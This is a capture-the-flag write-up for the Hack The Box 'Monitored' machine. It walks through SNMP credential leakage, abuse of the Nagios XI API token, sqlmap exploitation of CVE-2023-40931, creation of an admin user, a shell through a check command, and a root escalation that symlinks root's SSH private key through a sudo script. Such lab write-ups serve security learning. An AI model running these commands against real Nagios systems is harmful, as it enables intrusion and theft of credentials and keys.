---
title: Monitored
date: 2026-09-30
description: Medium Linux box pulling svc creds from SNMP, bypassing a disabled Nagios account with an API token, SQLi through CVE-2023-40931 for an admin key, and symlinking root's id_rsa via getprofile.sh.
tags:
  - htb
  - Medium
  - Linux
---

# Initial Recon

```sh
# Nmap 7.98 scan initiated Wed Sep 30 12:12:09 2026 as: /usr/lib/nmap/nmap -p22,80,389,443,5667 -A -oN scan_results.txt 10.129.11.125
Nmap scan report for monitored.htb (10.129.11.125)
Host is up (0.79s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
|_  256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
80/tcp   open  http       Apache httpd 2.4.56
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   Apache httpd 2.4.56 ((Debian))
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK
| Not valid before: 2023-11-11T21:46:55
|_Not valid after:  2297-08-25T21:46:55
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Nagios XI
|_ssl-date: TLS randomness does not represent time
5667/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 389/tcp)
HOP RTT       ADDRESS
1   744.41 ms 10.10.16.1
2   373.28 ms monitored.htb (10.129.11.125)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep 30 12:13:20 2026 -- 1 IP address (1 host up) scanned in 70.49 seconds
```

- It redirected to `nagios.monitored.htb`
- We got a login page `https://nagios.monitored.htb`


```sh
# Nmap 7.98 scan initiated Wed Sep 30 12:13:20 2026 as: /usr/lib/nmap/nmap -sU -sV -F -open -oN udp_scan_results.txt 10.129.11.125
Nmap scan report for monitored.htb (10.129.11.125)
Host is up (0.66s latency).
Not shown: 96 closed udp ports (port-unreach)
PORT    STATE         SERVICE VERSION
68/udp  open|filtered dhcpc
123/udp open          ntp     NTP v4 (unsynchronized)
161/udp open          snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
162/udp open          snmp    net-snmp; net-snmp SNMPv3 server
Service Info: Host: monitored

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep 30 12:16:44 2026 -- 1 IP address (1 host up) scanned in 203.70 seconds
```

The SNMP service is open:
- Checking for the community string

```sh
onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt 10.129.11.125
```

- Community string => `public`

```sh
snmpwalk -v2c -c public 10.129.11.125
```

Waited a long time till I got this number "iso.3.6.1.2.1.25.4.2.1.**5**.621":

```output
sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB
```

Gained username and password

> `svc - XjH7VCehowpR1xZB`

Tried to login but it gave an error message different from the normal one.

#### Bypassing Disabled Account Restrictions
- We have credentials, but we cannot access the web interface due to the account being disabled.
- Researching Nagios, we find this post on the Nagios forums that provides the following command:

> Reference : https://support.nagios.com/forum/viewtopic.php?p=310724&hilit=login+insecure+login#p310724

Utilizing the service's API which we got from the forum:

```sh
curl -XPOST -k -L 'http://YOURXISERVER/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=nagiosadmin&password=YOURPASS&valid_min=5'
```

We attempt the same request using the discovered credentials:

```sh
curl -XPOST -k -L 'http://nagios.monitored.htb/nagiosxi/api/v1/authenticate' -d
'username=svc&password=XjH7VCehowpR1xZB&valid_min=1000' | jq
```

```output
{
"username" : "svc",
"user_id": "2",
"auth_token": "f2ea23fc0c6fa7db56c0f938cbc22b429d63f8e2",
'valid_min': 1000,
"valid_until": "Thu, 1 Oct 2025 02:36:12 -0500"
}
```

We gained an authentication token for `svc`

The next command in the post shows how this token can be used:

```sh
curl -k -L 'http://YOURXISERVER/nagiosxi/includes/components/nagioscore/ui/trends.php?createimage&host=localhost&token=TOKEN' > image.png
```

So we can do actions with the token:

```url
https://nagios.monitored.htb/nagiosxi/login.php?token=f2ea23fc0c6fa7db56c0f938cbc22b429d63f8e2
```

We logged in as the `svc` user.

- Version in the bottom left corner => `Nagios XI 5.11.0`

# User

> CVE-2023-40931 : https://www.cve.org/CVERecord?id=CVE-2023-40931
> Reference : https://outpost24.com/blog/nagios-xi-vulnerabilities/#1-sql-injection-in-banner-acknowledging-endpoint-cve-2023-40931

According to the CVE, this version allows authenticated attackers to execute arbitrary **SQL commands** via the **ID** parameter in the **POST** request to **/nagiosxi/admin/banner_message-ajaxhelper.php**

According to the reference, the POST data consists of the intended action and message ID – `action=acknowledge banner message&id=3`.

Exploitation:
- Intercept and modify the request
- With a **wild card** (`*`) on the **id** parameter it returns a sql syntax error which **revealed sql server information** (MariaDB aka MySQL)

- Grab the request or grab the cookie — we can use the `--cookie` flag on **sqlmap** (we went with the cookie flag because the **request file** didn't work great with **sqlmap** even after adding the Content-type header)

```sh
sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3" --batch -p id --cookie="nagiosxi=enl7c4k4t90oqb32ddehrdd9s7" --dbs --threads=10
```

- database - `nagiosxi`

```sh
sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3" --batch -p id --cookie="nagiosxi=enl7c4k4t90oqb32ddehrdd9s7" -D nagiosxi --threads=10 --tables
```

- table - `xi_users`

```sh
sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3" --batch -p id --cookie="nagiosxi=enl7c4k4t90oqb32ddehrdd9s7" -D nagiosxi --threads=10 -T xi_users --dump
```

```output
| ID      | EMAIL               | USERNAME             | API-KEY

| 1       | admin@monitored.htb | Nagios Administrator | IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
 
| 2       | svc@monitored.htb   | svc                  | vZlmJoAEAO9ISmM5TnWdFeqtsNb3mlkF2sdPsQVKteiNTNuOufPQqr43gHV3tlKl
```

- We gained a **bcrypt hash** as well but we have the **api-key**, so no need to waste time cracking it.

> Reference : https://www.exploit-db.com/exploits/44969

In the above reference it shows how to use the api key to create a new user with admin privilege:
- `/nagiosxi/api/v1/system/user` -> api pathway to create a new user
- `auth_level` => Parameter to assign a role for the new user

```sh
curl -k -s 'http://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL' -d 'username=dante&password=dante&name=dante&email=dante@localhost&auth_level=admin' 
```

Log in as `dante` (admin)

- Navigate to `Configure > Core Config Manager > Commands`
- Create a new command.
- Then add a new command called `ashell` (so it sits on top, we don't have to search for it)
- Click Save, then Apply Configuration

- Setup a listener

Now navigate to `Monitoring > Hosts`:
- Click on `localhost` 
- Select `shell` as the `check command`
- Click on `Run check command`

Gained shell as user `nagios`

# Root

```sh
sudo -l

User nagios may run the following commands on localhost:
    (root) NOPASSWD: /etc/init.d/nagios start
    (root) NOPASSWD: /etc/init.d/nagios stop
    (root) NOPASSWD: /etc/init.d/nagios restart
    (root) NOPASSWD: /etc/init.d/nagios reload
    (root) NOPASSWD: /etc/init.d/nagios status
    (root) NOPASSWD: /etc/init.d/nagios checkconfig
    (root) NOPASSWD: /etc/init.d/npcd start
    (root) NOPASSWD: /etc/init.d/npcd stop
    (root) NOPASSWD: /etc/init.d/npcd restart
    (root) NOPASSWD: /etc/init.d/npcd reload
    (root) NOPASSWD: /etc/init.d/npcd status
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/components/autodiscover_new.ph  *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
    (root) NOPASSWD: /usr/bin/php    /usr/local/nagiosxi/scripts/migrate/migrate.php *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
```

Reading the source code, the `getprofile.sh` script file looks interesting:

```txt
/usr/local/nagiosxi/scripts/components/getprofile.sh
```

Part of its functionality is intended to **collect** and consolidate various logs and configuration files into a **profile directory** specified by the **user**. This script takes a **command-line argument**, which is intended to be the directory name or identifier for storing the profile.


```sh
#!/bin/bash

# GRAB THE ID
folder=$1
if [ "$folder" == "" ]; then
    echo "You must enter a folder name/id to generate a profile."
    echo "Example: ./getprofile.sh <id>"
    exit 1
fi

...<SNIP>...

echo "Getting phpmailer.log..."
if [ -f /usr/local/nagiosxi/tmp/phpmailer.log ]; then
    tail -100 /usr/local/nagiosxi/tmp/phpmailer.log > "/usr/local/nagiosxi/var/components/profile/$folder/phpmailer.log"
fi

...<SNIP>...
```
- The script checks if **phpmailer.log** **exists** in the **/usr/local/nagiosxi/tmp/** directory and if so, it uses the **tail command** to copy the last 100 lines of this log file into a designated folder within `/usr/local/nagiosxi/var/components/profile/`.

Since we can run the script with elevated privileges, this functionality is vulnerable.

#### Two attack ways
- We can set a **PATH** variable and create a fake **tail** binary to gain a shell
- symbolic link - to copy (the functionality of `getprofile.sh` script) the ssh key of root

#### Symlink aka Symbolic link 

```sh
ls -la /usr/local/nagiosxi/tmp/phpmailer.log
```

There's **no file** named `phpmailer.log` and the **tmp** directory is writable by the user.

Check the **SSH configuration** to see if authentication as **root** is enabled, and if `PubkeyAuthentication` is enabled:

```sh
cat /etc/ssh/sshd_config | grep -E 'PermitRootLogin|PubkeyAuthentication'
```

```sh
PermitRootLogin prohibit-password
PubkeyAuthentication yes
```

This configuration means that if the **root** user has a **private key** in their **.ssh** directory, we'll be able to use it to authenticate.


Exploitation:
- Create a **symlink** on the tmp directory:

```sh
ln -s /root/.ssh/id_rsa /usr/local/nagiosxi/tmp/phpmailer.log
```

Now when the script tries to copy **phpmailer.log** it **points** to the **id_rsa** key of **root** and copies that.

- Execute the script with an arbitrary folder name:

```sh
sudo ./getprofile.sh 1
```

- Access the copied data in `/usr/local/nagiosxi/var/components/profile.zip`
- Copy the zip file to the tmp directory:

```
cp /usr/local/nagiosxi/var/components/profile.zip /tmp/
```

- Unzip it and check for the key:

```sh
cat profile-1699756647/phpmailer.log
```

Gained `root`
